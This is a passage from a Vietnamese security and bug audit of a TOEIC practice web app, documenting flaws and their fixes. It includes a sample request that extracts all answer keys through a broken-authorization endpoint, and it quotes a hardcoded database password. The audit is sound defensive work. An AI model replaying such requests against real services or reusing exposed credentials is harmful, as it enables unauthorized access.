| **`MSSQL_PID=Developer`** — bản Developer **miễn phí nhưng cấm dùng production** | `docker-compose.yml:26` | Đổi `Express` (miễn phí cho production; giới hạn 10GB DB / 1.4GB buffer / 4 core — thừa cho dự án) |
| **Bind port ra `0.0.0.0`** — SQL Server và Redis lộ ra **toàn bộ card mạng**, comment khẳng định ngược lại là "chỉ expose local" | `docker-compose.yml:27-28, 50-51` | Bản production: **bỏ hẳn** mục `ports`, để container nói chuyện qua mạng nội bộ Docker |
| **Hardcode mật khẩu thật làm fallback** `${DB_PASSWORD:-ToeicMaster@2026}` — vô hiệu hóa hoàn toàn việc gitignore `.env` | `docker-compose.yml:25, 33, 57, 65` | Bỏ fallback, để compose báo lỗi nếu thiếu biến |

> **Vì sao bind `0.0.0.0` nguy hiểm:** SQL Server hở ra Internet với tài khoản `sa` sẽ bị bot quét và
> tấn công **trong vòng vài giờ**. Đây là một trong những cách bị hack nhanh nhất.

## 1.8 · ✅ ĐÃ VÁ 2026-08-05 — File media hoàn toàn public

> **Cách vá — 2 phần:**
>
> **a) Backend:** chuyển 286 file (158 MB) từ `wwwroot/uploads/tests/` sang
> `protected-media/tests/` (**ngoài** wwwroot), serve qua `MediaFileController`. Avatar giữ ở
> `wwwroot` (thật sự công khai). `MediaPathProvider` gom logic đường dẫn + chống path traversal.
> SQL UPDATE 304 dòng URL trong DB (200 audio + 104 image, có ca 2 URL cách nhau bằng `;`).
>
> **b) Frontend — signed URL:** thẻ `<audio>`/`<img>` do **trình duyệt** tải nên không gắn được
> `Authorization` header. `MediaTokenService` cấp token HMAC-SHA256 sống **10 phút**, FE gắn vào
> `?t=`. `getMediaUrl()` tự trích `testId` từ đường dẫn bằng regex → **11 chỗ gọi không phải sửa**.
>
> **Ba tầng bảo vệ** (tầng 2-3 thêm sau khi tự phát hiện lỗ hổng):
>
> | Tầng | Trả lời | Cách |
> |---|---|---|
> | 1 | Có đăng nhập? | Token ký HMAC, 10 phút |
> | 2 | Đề này được xem? | Kiểm `IsPublished` **lúc cấp** token (cấp 1 lần/10 phút vs tải 100+ lần) |
> | 3 | Đúng đề đã cấp? | Ký `testId` **vào** chữ ký → token đề 1 không tải được đề 2 |
>
> **Vì sao chọn signed URL, không dùng Blob URL:** Blob phải tải hết file mới phát → mất streaming
> và không tua được. Audio ~400KB/câu × 100 câu, Day 55 (thi trên 4G) sẽ lộ ngay.
>
> **Giới hạn phải biết:** không chống được học viên hợp lệ tải hết audio của **chính đề mình đang
> thi** rồi chia sẻ. Đó là chống *sao chép nội dung*, khác *truy cập trái phép* — cần rate limit
> + audit log, không đáng làm cho dự án này.
>
> **Đã kiểm chứng 10/10:** 401 không token · **200 với `?t=`** · 401 token sai · 200 Bearer ·
> **206 Range** · **401 token đề 1 → đề 2** · 401 `/token` ẩn danh · **403 học viên xin token đề
> nháp** · 200 Admin xin token đề nháp · 404 đề không tồn tại.
>
> ⚠️ **Chưa test trên trình duyệt thật** — cần xác nhận `/media/token` chỉ gọi 1 lần (không phải
> 100 lần) và audio tua được.

**Vị trí:** [Program.cs:215-217](../backend/ToeicMasterPro.API/Program.cs#L215)
```csharp
app.UseStaticFiles();        // ← đứng TRƯỚC
app.UseCors("Frontend");
app.UseAuthentication();     // ← authentication chạy SAU
```

Middleware chạy tuần tự: `UseStaticFiles` khớp đường dẫn `/uploads/...` là **trả file rồi dừng**,
không bao giờ chạm tới `UseAuthentication`.

**Hậu quả:** toàn bộ **audio đề thi, ảnh đề thi, avatar user** tải được không cần token. Đoán được
đường dẫn là lấy được. Với đề TOEIC có bản quyền thì đây là vấn đề thật.

**Cách sửa:** tách hai loại tài nguyên — file thật sự công khai giữ ở `wwwroot`, file cần bảo vệ chuyển
sang serve qua controller có `[Authorize]`:
```csharp
[HttpGet("audio/{testId:Guid}/{fileName}")]
[Authorize]
public IActionResult GetAudio(Guid testId, string fileName) { /* kiểm quyền rồi trả PhysicalFile */ }
```

---

# 2. Vấn đề ảnh hưởng trực tiếp người dùng

> Không chặn deploy, nhưng **user sẽ gặp ngay** khi dùng thật.

## 2.1 · ✅ ĐÃ SỬA 2026-08-08 (kiểm chứng end-to-end 08-08) — User bị đá khỏi bài thi ở phút 61

> **Trạng thái:** đã code. Response interceptor ở [axios.ts](../frontend/src/api/axios.ts) nay bắt 401
> → tự gọi `/auth/refresh-token` (cookie tự gửi kèm) → set access token mới vào RAM → **gọi lại request
> gốc**, không đá về login nữa. Có biến `refreshPromise` gộp mọi 401 đồng thời vào MỘT lần refresh
> (chống refresh token race). Silent refresh lúc F5 ở [useSilentRefresh.ts](../frontend/src/hooks/useSilentRefresh.ts).
> ✅ **Đã xác nhận 2026-08-08:** F5 liên tục 15 lần giữ nguyên phiên đăng nhập, không 401/429 lần nào.
> Quá trình test này làm lộ ra mục 2.9 — F5 vài lần là bị đá về `/login` vì rate limit.

**Vị trí (bản gốc trước khi sửa):** [axios.ts](../frontend/src/api/axios.ts)

Response interceptor gặp 401 thì **xóa token và chuyển về `/login`** — **không hề gọi refresh token**.

Backend **có** `/api/auth/refresh`, frontend **có** lưu refresh token, nhưng **chưa bao giờ dùng đến**.

**Con số cụ thể — đây là lỗi nặng nhất về trải nghiệm:**
- Access token: **60 phút** (cấu hình trong appsettings)
- Bài thi TOEIC full: **~2 tiếng** (Listening 45' + Reading 75')

→ **Mọi user thi full test đều sẽ bị đá ra giữa chừng.** Không phải rủi ro — là điều **chắc chắn xảy ra**.

**Cách sửa:**
```ts
let refreshing: Promise<string> | null = null

api.interceptors.response.use(undefined, async (error) => {
  const original = error.config
  if (error.response?.status !== 401 || original._retry) return Promise.reject(error)
  original._retry = true

  // Gộp mọi request 401 đồng thời vào MỘT lần refresh (chống refresh token race)
  refreshing ??= authService.refresh(getRefreshToken()!)
      .then(r => { saveTokens(r.accessToken, r.refreshToken); return r.accessToken })
      .finally(() => { refreshing = null })

  const newToken = await refreshing
  original.headers.Authorization = `Bearer ${newToken}`
  return api(original)
})
```

> **Keyword: refresh token race.** Nhiều request cùng 401 → cùng gọi refresh → token rotation làm các
> lần sau thất bại. Biến `refreshing` giữ chung một promise là cách chuẩn để chống.

**Cách chữa cháy tạm nếu chưa kịp sửa:** nâng `AccessTokenExpiryMinutes` lên 180. Không phải giải pháp
đúng (token sống lâu = lộ thì thiệt hại lâu) nhưng chặn được lỗi mất bài ngay lập tức.

## 2.2 · ✅ ĐÃ SỬA 2026-08-10 (kiểm chứng end-to-end) — F5 giữa bài thi mất sạch

> **Trạng thái:** đã sửa trọn vẹn, gộp luôn Day 46 (ràng buộc thời gian phía server) vì cùng một mốc
> dữ liệu. Thêm cột `TestSession.ReadingStartedAt`; `StartAsync` **idempotent** — có phiên `InProgress`
> cùng `(UserId, TestId, PartsFilter)` thì trả lại phiên đó kèm đáp án đã lưu; endpoint
> `POST /{id}/reading-start` đặt mốc **một lần duy nhất** và trả `readingSecondsLeft` do server tính.
>
> **Kiểm chứng bằng dữ liệu, không phải bằng mắt:** tổng phiên `InProgress` giữ ở **1** qua nhiều lần
> F5 (trước đây mỗi F5 đẻ thêm một phiên — DB từng tích 82 phiên rác) · toast báo *"còn 74:14"* thay
> vì 74:59, chứng minh mốc không bị ghi đè · chặn ghi sau giờ: DB giữ nguyên 3 đáp án, không thành 4 ·
> `CompletedAt = ReadingStartedAt + 80 phút` dù bấm nộp muộn 100 phút.
>
> **Ba điều thiết kế khác kế hoạch gốc — đều có lý do:**
> 1. **Bỏ `sessionStorage`.** Nó chết khi đóng tab, không dùng chung giữa các tab, mất khi đổi máy.
>    Server đã biết ai đang thi dở bài gì — để server làm nguồn sự thật thì đúng ở mọi tình huống,
>    kể cả mở lại trên điện thoại.
> 2. **`PartsFilter` là một phần định danh phiên.** Đang dở Part 5,6,7 mà vào full đề là **hai bài
>    khác nhau**. Chỉ khớp `TestId` sẽ ném user vào bài cũ sai phạm vi.
> 3. **Listening không bị bó giờ** — xem phân tích ở khối dưới.

**Vị trí (bản gốc trước khi sửa):** [MockTestPlayPage.tsx:131-194](../frontend/src/pages/MockTestPlayPage.tsx#L131)

F5 → component mount lại → gọi `start` → **tạo phiên thi MỚI**. Đồng hồ reset về 75:00, đáp án biến
khỏi màn hình (dữ liệu vẫn còn trong DB ở phiên cũ, nhưng user không vào lại được).

Có `beforeunload` cảnh báo, nhưng user vẫn F5 được — và trình duyệt mobile đôi khi tự reload tab.

**Cách sửa:**
```ts
// Lưu sessionId khi start
sessionStorage.setItem(`exam:${testId}`, sessionId)

// Khi mount: có phiên đang dở thì khôi phục thay vì tạo mới
const existing = sessionStorage.getItem(`exam:${testId}`)
if (existing) { /* GET /api/test-session/{id} → khôi phục đáp án + thời gian còn lại */ }
```
Backend cần thêm endpoint trả phiên `InProgress` kèm đáp án đã lưu.

> Kèm theo: server nên lưu `StartedAt` và tính thời gian còn lại **phía server** — hiện tại
> `DurationMinutes` chỉ là số trang trí, **không có ràng buộc thời gian nào ở server**, phiên thi có
> thể nộp sau nhiều ngày.

### Quyết định: Reading bó giờ chặt, Listening để yên 🔬

Tra ETS: **45 phút Listening · 75 phút Reading**. Nhưng điểm mấu chốt là **cách 45 phút đó được thực
thi**: trong phòng thi thật, Listening là **một băng ghi âm chạy liên tục**, không có đồng hồ nào cho
thí sinh nhìn. Con số 45 là **mô tả độ dài cuốn băng**, không phải luật canh bằng đồng hồ.

App này cũng vậy: audio tạo bằng `new Audio()` — **không có controls**, không pause, không tua, không
nghe lại — và trình duyệt **vẫn phát đúng tốc độ khi tab ở nền** (media được miễn trừ khỏi cơ chế bóp
tài nguyên tab nền). **Băng chính là đồng hồ.**

Reading thì ngược lại: không có gì điều nhịp. Nên nó bắt buộc phải neo vào server — đúng **CWE-602
(Client-Side Enforcement of Server-Side Security)**: giờ phía client chỉ được dùng để **hiển thị**.

> **Tương phản đáng nhớ, cùng một trang, cùng chạy ở tab nền:**
>
> | | Ở tab nền |
> |---|---|
> | `new Audio()` | **Đúng tốc độ thật** — được miễn trừ |
> | `setInterval` (đồng hồ Reading) | **Bị bóp**, có thể xuống 1 lần/phút |
>
> Đây chính là lý do Listening **tự nó đáng tin** còn Reading thì **không**. Sự phân đôi này khớp
> đúng ranh giới kỹ thuật, không phải trùng hợp.

**Hạn thực tế** = `min(ReadingStartedAt + 80 phút, StartedAt + 24 giờ)`. Vế thứ hai **không phải luật
thi** — chỉ để phiên bỏ dở không nằm `InProgress` vĩnh viễn.

**Hệ quả chấp nhận:** phiên có thể kéo dài nhiều giờ nếu user bỏ dở rồi quay lại. Điểm số **vẫn hợp
lệ** vì từng phần đều được điều nhịp đúng — tính hợp lệ đến từ nhịp của **từng section**, không phải
từ tổng thời gian đồng hồ treo tường. Xem lại nếu sau này có bảng xếp hạng hoặc điểm dùng để so giữa
người dùng với nhau.

**Quá hạn thì vẫn chấm, không từ chối.** Từ chối sẽ phạt oan người mất mạng đúng lúc hết giờ và làm
phiên kẹt `InProgress` vĩnh viễn. An toàn vì `SaveAnswers` đã chặn ghi sau hạn — đáp án trong DB chắc
chắn là những gì làm được **trong giờ**.

### Ba cái bẫy chỉ lộ ra khi chạy thật

**1. Hai lối vào Reading, không phải một.** `startReadingSection()` là lối "chính thống" sau Listening,
nhưng đề chỉ có Reading (`?parts=5,6,7`) đi thẳng từ effect mount. Chỉ móc vào lối thứ nhất thì phiên
Reading-only **không bao giờ đặt mốc**, `ReadingStartedAt` mãi null, server không có gì để tính.

**2. Thứ tự nhánh quyết định đúng/sai.** Nhánh "đã từng vào Reading" phải đứng **trước** nhánh "có Part
Listening" — vì bài full test luôn thỏa điều kiện thứ hai. Để sai thứ tự thì F5 giữa Reading sẽ ném
user về nghe lại từ đầu: khôi phục đáp án đúng nhưng ném sai chỗ, còn khó chịu hơn.

**3. `flushSaveAnswers` suýt vô hiệu hóa cả quyết định "quá hạn vẫn chấm".** `handleSubmit` gọi
`await flushSaveAnswers()` **trước** `submit`. Khi hết giờ, lời gọi đó bị server từ chối → ném lỗi →
`submit` **không bao giờ chạy tới**. Backend sẵn sàng chấm mà frontend không bao giờ hỏi. Phải nuốt lỗi
**có chủ ý** ở flush — một trong số rất ít trường hợp `catch {}` trống là hành vi đúng, nên bắt buộc
phải ghi lý do vào comment kẻo người review sau xóa mất.

> **Bài học về cách kiểm chứng:** mọi lần **tải lại trang đều xóa trạng thái test** — kể cả khi Vite
> HMR tự nạp lúc sửa code. Ba lần thử đầu đều "không thấy báo gì" vì lúc bấm chọn đáp án thì phiên đã
> được cấp mới còn nguyên 75 phút. Sửa code chính là hành động phá mất điều kiện thử nghiệm.

### Hỏi khi vào lại từ ngoài (2026-08-11)

F5 và "vào lại từ danh sách đề" là **hai ý định khác nhau**, và may là chúng nằm ở **hai route khác
nhau** nên phân biệt được chính xác, không cần đoán:

| Route | Hành vi | Vì sao |
|---|---|---|
| `/mock-test/:id/play` | **Khôi phục im lặng** + toast | F5 giữa bài gần như luôn là tai nạn — dựng hộp thoại chắn đường lúc đang căng thẳng là thêm gánh nặng |
| `/mock-test/:id` | **Popup hỏi** Tiếp tục / Bỏ bài thi | Vào lại là chủ ý, mà user có thể đã quên còn bài dở — im lặng ném vào bài cũ mới là gây bất ngờ |

Thêm `GET /active?testId=` (chỉ đọc, **không lọc theo parts** — ở màn cấu trúc user chưa chọn phạm vi)
và `POST /{id}/abandon`. `GET /active` dùng **chung luật hết hạn** với `StartAsync`: phiên quá hạn thì
đóng luôn và coi như không có, để popup không mời user "tiếp tục bài còn 0 phút" rồi vào tới nơi lại
được cấp phiên mới — thông báo nói dối còn tệ hơn không có thông báo.

**Khôi phục về đúng câu đang làm dở** — suy từ đáp án đã lưu (câu có `orderIndex` lớn nhất trong số đã
trả lời), không cần thêm cột. Phải dò qua `buildReadingItemsForPart` chứ **không đếm câu tuần tự**:
Part 6–7 gộp nhiều câu chung một đoạn văn thành **một màn**, nên "câu thứ 12" và "màn thứ 12" là hai
con số khác nhau — đếm tuần tự sẽ vượt quá số màn và rơi vào màn trắng.

> **Nhãn nút là một quyết định bảo mật dữ liệu.** Ý đầu là hai nút *"Hủy"* và *"Tiếp tục làm"*, trong
> đó "Hủy" sẽ abandon phiên. **Sai** — `AlertDialogCancel` đi chung đường đóng với **Esc** và **bấm ra
> ngoài overlay**, nên người chỉ muốn xem cấu trúc đề rồi bấm Hủy (hoặc lỡ chạm Esc) sẽ mất bài đang
> làm dở. Đó là **hành động phá hủy nấp sau nhãn vô hại** — cùng loại lỗi với `.catch(() => logout())`
> ở mục 2.9 và câu *"kiểm tra mạng"* ở trên: hệ thống làm một việc khác hẳn điều nó nói.
>
> Đã đổi thành **"Bỏ bài thi"** màu đỏ (`variant="destructive"`), dùng `<Button>` thường thay vì
> `AlertDialogCancel`. Ranh giới giờ rõ: bấm nút đỏ = mất bài có chủ ý · **Esc / bấm ngoài = chỉ đóng
> popup, không đụng dữ liệu**. Nhãn tự cảnh báo nên không cần xác nhận hai bước.

## 2.3 · ✅ ĐÃ VÁ 2026-08-11 — Import Excel tạo được câu hỏi KHÔNG có đáp án đúng

> **Trạng thái:** đã vá. Kiểm DB trước khi sửa: **697 câu hỏi, 0 câu hỏng** — lỗi chưa từng kích hoạt
> trên dữ liệu thật, nên đây là vá **phòng ngừa**, không phải dọn hậu quả.
>
> ### 🔬 Doc cũ mô tả SAI vị trí lỗ hổng
>
> Doc ghi *"luồng import bỏ qua kiểm tra"* — nghe như import không kiểm gì cả. Thực tế nó **có** bộ
> kiểm riêng: bắt buộc có A và B, bắt buộc `CorrectAnswer` ∈ {A,B,C,D}. Nhìn qua thì kín.
>
> **Lỗ thật nằm ở chỗ khác** — `optionMap.Where(kv => !IsNullOrWhiteSpace(kv.Value))` **lọc bỏ đáp án
> rỗng**, rồi mới gán `IsCorrect = kv.Key == correct` trên tập đã lọc:
>
> | Cột | Giá trị |
> |---|---|
> | OptionA / OptionB / OptionD | có nội dung |
> | **OptionC** | **để trống** |
> | **CorrectAnswer** | **C** |
>
> Kiểm chữ cái cho qua vì `"C"` hợp lệ · `.Where` lọc bỏ C vì rỗng · không option nào còn `Label == "C"`
> → **câu hỏi ra đời với 0 đáp án đúng**.
>
> **Bản chất:** validation hỏi *"chữ cái có hợp lệ không"* nhưng không hỏi *"chữ cái đó có trỏ vào đáp
> án tồn tại không"*. Hai câu hỏi khác nhau, chỉ hỏi câu thứ nhất. Sửa theo doc cũ (thêm `Validate()`)
> thì vẫn khỏi, nhưng không hiểu vì sao — và lần sau gặp mẫu tương tự vẫn mắc lại.
>
> **Cách vá — sửa gốc, không vá triệu chứng:**
> 1. Tách `ValidateOptionSet(optionCount, correctCount)` thành **bất biến dùng chung**. Gốc rễ là *hai
>    luồng có hai bộ luật*; dùng chung một hàm thì không thể lệch nhau nữa
> 2. Kiểm `optionMap[correct]` có nội dung không — bịt đúng lỗ đã biết, thông báo nêu **đúng tên cột**
>    để CM mở Excel sửa ngay thay vì dò 200 dòng
> 3. Gọi `ValidateOptionSet` sau khi dựng `options_list` — lưới an toàn cho những đường **chưa biết**
>
> **Còn nợ (không chặn):** `SaveChangesAsync` nằm **trong vòng lặp** nên dòng hỏng ở giữa file vẫn để
> lại các dòng trước đó trong DB — không có rollback. Xem phần góp ý import ZIP ở mục 3.4.

**Vị trí:** [QuestionService.cs:218-233](../backend/ToeicMasterPro.Infrastructure/Services/QuestionService.cs#L218)

Luồng tạo câu hỏi qua API có `Validate()` bắt buộc đúng 1 đáp án đúng. **Luồng import Excel bỏ qua
kiểm tra đó.**

Trong khi `SubmitAsync` gặp câu không có đáp án đúng thì **trả lỗi cho cả bài thi**:
```csharp
if (correctOpt is null)
    return Result<...>.Failure($"Câu OrderIndex {tq.OrderIndex} chưa có đáp án đúng trong DB.");
```

**Hậu quả:** CM import một file Excel sai một ô → **mọi user làm đề đó đều không nộp bài được**, vĩnh
viễn, cho tới khi có người phát hiện và sửa DB.

**Cách sửa:** dùng chung `Validate()` cho cả luồng import; dòng nào sai thì bỏ qua và báo cáo, không tạo.

## 2.4 · ✅ ĐÃ VÁ 2026-08-11 — `POST /api/practice/submit` là máy tra đáp án

> ### 🔬 Doc cũ đánh giá NHẸ hơn thực tế
>
> Doc mô tả *"gửi đáp án A → biết đúng/sai → thử B, C, D"* — giả định phải **dò từng đáp án**.
> Thực tế **không cần dò**: `PracticeAnswerReview` trả `CorrectOptionId`, `CorrectLabel` và
> `Explanation` **vô điều kiện**, còn `SelectedOptionId = null` được coi là "bỏ qua" nên vẫn đi tiếp
> và vẫn vào `reviews`.
>
> ```jsonc
> POST /api/practice/submit
> { "answers": [ { "questionId": "<id lấy từ màn thi>", "selectedOptionId": null } ] }
> → { "reviews": [ { "correctOptionId": "…", "correctLabel": "B", "explanation": "…" } ] }
> ```
>
> **Một request. Không đoán. Không thử.** Và không có trần trên `req.Answers.Count` — nhét cả 200
> `questionId` của đề vào một request là nhận **toàn bộ đáp án đúng của cả đề trong một lần gọi**.
> Rate limit cũng không chặn: policy `"auth"` chỉ áp cho `AuthController`.
>
> ### Gốc rễ: service không biết ai đang gọi
>
> ```csharp
> public async Task<Result<PracticeResultResponse>> SubmitAsync(SubmitPracticeRequest req)
> ```
>
> **Không có `userId`.** So với `TestSessionService.SubmitAsync(Guid userId, Guid sessionId)` — nơi
> kiểm `session.UserId != userId` từ Day 28. `PracticeService` **về mặt kiểu dữ liệu không thể** kiểm
> quyền sở hữu: dù có muốn cũng không có gì để so.
>
> Controller **có** `[Authorize(Roles = "User")]` nên phải đăng nhập. Nhưng đó là **authentication**,
> không phải **authorization**: hệ thống biết bạn LÀ AI, chỉ không kiểm bạn CÓ QUYỀN với dữ liệu này
> không. Đúng OWASP **API1:2023 — Broken Object Level Authorization**.
>
> ### Cách vá
>
> Thêm entity `PracticeSession` (`UserId`, `QuestionIds` nối bằng phẩy, `SubmittedAt`,
> `CorrectCount`/`TotalCount`). `GetQuestionsAsync` tạo phiên ghi lại **đã phát câu nào cho ai**;
> `SubmitAsync(userId, req)` kiểm phiên **tồn tại + đúng chủ + chưa nộp**, rồi chốt chặn:
>
> ```csharp
> if (questionIds.Any(qid => !allowed.Contains(qid)))
>     return Failure("Có câu hỏi không thuộc phiên luyện tập này.");
> ```
>
> `userId` lấy từ **JWT**, không nhận từ client — để client tự khai thì kiểm quyền sở hữu thành vô nghĩa.
>
> **Không tách bảng con cho `QuestionIds`:** luyện tập là **một lượt** (phát câu → làm → nộp một lần),
> tập id chỉ đọc nguyên khối đúng một lần lúc chấm. Bảng con sẽ tạo 10–50 dòng mỗi lượt cho dữ liệu
> không ai join tới. Đánh đổi: không thống kê được "câu X được luyện bao nhiêu lần" bằng SQL.
>
> ### ⚠️ Rủi ro CÒN LẠI — không kín tuyệt đối
>
> Bản vá biến *"một request → đáp án chính xác"* thành *"phải rút thăm cho tới khi trúng"*. Muốn tra
> một câu cụ thể giờ phải gọi `GET /practice/questions` liên tục và hy vọng câu đó rơi vào lô ngẫu
> nhiên trong 697 câu — bộ lọc `part`/`difficulty`/`tag` giúp thu hẹp phần nào.
>
> Bịt kín hoàn toàn cần **tách kho luyện tập khỏi kho đề thi**, hoặc bỏ `Explanation` khỏi phản hồi.
> Cả hai là thay đổi nghiệp vụ lớn. Ghi lại để sau này không ai tưởng lỗ đã kín hẳn.

**Vị trí:** [PracticeService.cs:69-114](../backend/ToeicMasterPro.Infrastructure/Services/PracticeService.cs#L69)

Endpoint chấm **bất kỳ `questionId` nào** được gửi lên, không kiểm tra câu đó có thuộc phiên luyện của
user không.

→ User đang thi thật, lấy `questionId` từ màn hình, gửi vào `/api/practice/submit` với đáp án A → biết
ngay đúng/sai → thử B, C, D. **Máy tra đáp án hợp lệ, có xác thực đàng hoàng.**

**Cách sửa:** tạo phiên practice có state (giống `TestSession`), chỉ chấm câu thuộc phiên đó.

## 2.5 · 🟠 📋 Autosave đáp án có chi phí O(n²)

**Vị trí:** [TestSessionService.cs:91-127](../backend/ToeicMasterPro.Infrastructure/Services/TestSessionService.cs#L91)

Mỗi lần user chọn một đáp án, `SaveAnswersAsync`:
1. Nạp lại **toàn bộ** câu hỏi trong phạm vi đề (để validate)
2. Nạp **toàn bộ** đáp án đã lưu của phiên
3. Sinh `UPDATE` cho mọi câu trong payload

Frontend debounce nhưng vẫn gọi rất nhiều lần trong một bài thi. Với 200 câu, tổng chi phí một lượt thi
tăng theo **bình phương** số câu đã trả lời.

**Cách sửa:** cache tập `questionId` hợp lệ của phiên (Redis hoặc memory) thay vì query lại mỗi lần;
chỉ upsert đúng những câu có trong payload.

## 2.6 · ✅ ĐÃ SỬA 2026-08-08 (kiểm chứng end-to-end 08-08) — Logout thực tế không bao giờ được gọi

> **Trạng thái:** đã code. `authService.logout()` gọi `POST /api/auth/logout` (cookie tự gửi kèm) →
> backend thu hồi refresh token trong DB (`RevokedAt`) + xóa cookie (`Response.ClearRefreshTokenCookie`).
> [Header.tsx](../frontend/src/components/layout/Header.tsx) và
> [UserTopBar.tsx](../frontend/src/components/layout/UserTopBar.tsx) gọi API này **trước** khi xóa
> state RAM, bọc `try/catch/finally` để lỗi mạng không kẹt user trong app.
> ✅ **Đã xác nhận 2026-08-08:** sau logout, cookie `refreshToken` biến mất khỏi DevTools và `RevokedAt`
> trong DB đã được set.

**Vị trí (bản gốc):** [auth.store.ts](../frontend/src/store/auth.store.ts),
[Header.tsx](../frontend/src/components/layout/Header.tsx)

Frontend logout chỉ **xóa localStorage**. Backend **có** endpoint `/api/auth/logout` nhưng
**không ai gọi**.

→ Refresh token vẫn sống **30 ngày** trong DB sau khi user đã "đăng xuất". Ai có refresh token đó vẫn
lấy được access token mới.

## 2.7 · ✅ ĐÃ VÁ (Day 44) — Không có khóa tài khoản khi sai mật khẩu

Trước đây dùng `CheckPasswordAsync` → **bỏ qua hoàn toàn cơ chế lockout** của Identity, và
`Program.cs` cũng không cấu hình `options.Lockout.*`. Chỉ còn rate limit 5 req/phút **theo IP** —
đổi IP là brute-force thoải mái.

**Đã sửa:** `SignInManager.CheckPasswordSignInAsync(user, password, lockoutOnFailure: true)` +
`MaxFailedAccessAttempts = 5`, `DefaultLockoutTimeSpan = 15 phút`.

Dùng `CheckPasswordSignInAsync` **chứ không** `PasswordSignInAsync`: hàm sau còn issue thêm cookie
đăng nhập của Identity, mà app này chỉ dùng JWT tự cấp.

Thông báo lockout **có** rò rỉ "email này tồn tại" — chấp nhận **có chủ ý**: muốn khoá được một tài
khoản thì phải sai mật khẩu 5 lần, mà email không tồn tại đã bị chặn ở nhánh trên nên không bao giờ
vào được trạng thái khoá. Che đi thì user thật bị khoá 15 phút mà không hiểu vì sao.

**Từ Day 51:** mỗi lần sai mật khẩu và mỗi lần bị khoá đều ghi một dòng `AuditLogs` kèm IP →
Admin thấy được ai đang bị dò mật khẩu, thay vì chỉ có server im lặng biết.

## 2.8 · ✅ ĐÃ VÁ (Day 49) — Job nhắc lịch thi chạy sai giờ

Cron `"30 0 * * *"` — Hangfire mặc định hiểu theo **UTC**. Comment ghi "00:30 mỗi ngày" nhưng thực tế
chạy **07:30 giờ Việt Nam**.

Kèm hai lỗi trong `ExamReminderService`: gửi mail **trước khi** commit `EmailSent = true` →
`SaveChanges` lỗi sau khi mail đã gửi thì lần sau **gửi trùng**; và so khớp ngày **tuyệt đối**
(`ExamDate.Date == hôm nay + 3`) → job lỡ một ngày là **mất hẳn** lượt nhắc đó.

**Đã sửa cả ba:**
- `RecurringJobOptions { TimeZone = ResolveVietnamTimeZone() }` — thử `SE Asia Standard Time`
  (Windows) rồi `Asia/Ho_Chi_Minh` (Linux), fallback custom UTC+7. **Timezone ID khác nhau theo OS**
  nên hardcode một cái là vỡ khi deploy Docker.
- Cron đổi thành `"0 7 * * *"` (07:00 VN) cho mail nhắc, `"0 */3 * * *"` (mỗi 3 tiếng) cho sync IIG.
- `SaveChanges` **sau từng mail** + try/catch từng mail. Mail lỗi thì đặt lại `EmailSent = false`
  ngay — không làm vậy thì EF change tracker sẽ ghi `true` ở `SaveChanges` của mail **kế tiếp**.
- Điều kiện đổi thành khoảng `>= hôm nay && <= hôm nay + 3`.

## 2.9 · ✅ ĐÃ SỬA 2026-08-08 (kiểm chứng end-to-end 08-08) — F5 vài lần là bị đá về `/login`

> **Đây là lỗi TỰ TÌM RA khi test tay mục 2.1**, không nằm trong đợt audit. Đáng kể lại đầy đủ vì
> nó là ví dụ sạch của **triệu chứng nói dối**: trông y hệt lỗi authentication, thực chất là rate limit.

**Sự việc:** đăng nhập xong, F5 hai lần thì bình thường, **lần thứ ba bị đá về `/login`** như thể hết phiên.

**Ba lớp nguyên nhân xếp chồng — bỏ sót lớp nào thì lỗi vẫn còn:**

**Lớp 1 — mỗi lần F5 bắn 2 request thay vì 1.** `<StrictMode>` ở dev cố ý mount → cleanup → mount lại
để ép lộ effect không an toàn khi chạy lặp. Thân effect của `useSilentRefresh` là một lời gọi mạng thật
nên nó bay đi **hai lần**.

> **Cái bẫy:** deps `[]` kèm comment *"chỉ chạy 1 lần lúc mount"* — comment đó SAI trong ngữ cảnh
> StrictMode. `[]` chỉ chặn **re-render**, không chặn **mount**. StrictMode dựng component MỚI, mà với
> component mới thì `[]` nghĩa là "chạy lần đầu" — và React đang tạo ra *hai* lần đầu. `useRef` cũng vô
> dụng vì ref thuộc về component. Chỉ biến ở **module scope** mới sống sót qua vòng mount thứ hai.

**Lớp 2 — `refresh-token` bị nhốt chung hạn mức với `login`.** `[EnableRateLimiting("auth")]` đặt ở
**cấp class** trên `AuthController` → policy 5 req/phút/IP áp cho cả `refresh-token` và `logout`.
Đây là lỗi thiết kế thật, vì hai nhóm endpoint có **mô hình đe dọa khác hẳn nhau**:

| | `login` | `refresh-token` |
|---|---|---|
| Kẻ tấn công cần gì? | Đoán mật khẩu — **đoán được** | Cầm sẵn token 64 byte ngẫu nhiên — **không đoán nổi** |
| Siết chặt có tăng an toàn? | **Có** — brute-force bất khả thi | **Không** — chẳng ai brute-force được thứ đó |
| Ai chịu thiệt khi siết? | Kẻ tấn công | **User thật**, vì họ gọi nó liên tục |

**Lớp 3 — frontend hiểu nhầm "bị chặn" thành "hết phiên".** `useSilentRefresh` kết thúc bằng
`.catch(() => logout())` — bắt **mọi** lỗi rồi quy về một kết luận duy nhất, trong khi 401 / 429 / 5xx /
mất mạng mang bốn ý nghĩa hoàn toàn khác nhau. Chỉ 401 mới là bằng chứng token hỏng thật.

**Ba lớp cộng lại — số khớp chính xác với quan sát:**

| Hành động | Request | Cộng dồn |
|---|---|---|
| Đăng nhập | 1 | 1 |
| F5 lần 1 | 2 *(StrictMode)* | 3 |
| F5 lần 2 | 2 | 5 — hết quota |
| F5 lần 3 | 2 | thứ 6 → **429** → `.catch()` → `logout()` |

**Cách vá — cả ba lớp:**
1. `Program.cs`: thêm policy `"auth-refresh"` 30 req/phút
2. `AuthController`: `refresh-token` + `logout` đè sang policy mới ở **cấp action**; giữ `"auth"` ở cấp
   class làm mặc định siết — quên đánh dấu endpoint mới thì nó bị siết (phiền nhưng an toàn), thay vì
   không có rate limit nào (im lặng và nguy hiểm). Cùng tư duy fail-closed với fallback policy ở mục 1.1
3. `useSilentRefresh`: guard cấp **module** + gọi chung `refreshAccessToken()` đã export từ `axios.ts`
4. `axios.ts` + `useSilentRefresh`: **chỉ `logout()` khi 401**

> **Vì sao KHÔNG tắt `<StrictMode>` cho nhanh:** nó đang làm đúng việc — chỉ ra effect này không an toàn
> khi chạy 2 lần, và điều đó là sự thật khách quan chứ không phải chuyện riêng của dev. Hai request
> refresh song song mang **cùng một cookie** cùng rotate token ở server; hiện chưa nổ chỉ vì cả hai kịp
> đọc token trước khi bên nào ghi. Tắt StrictMode là **bịt đèn báo** — race vẫn nguyên và sẽ nổ ở
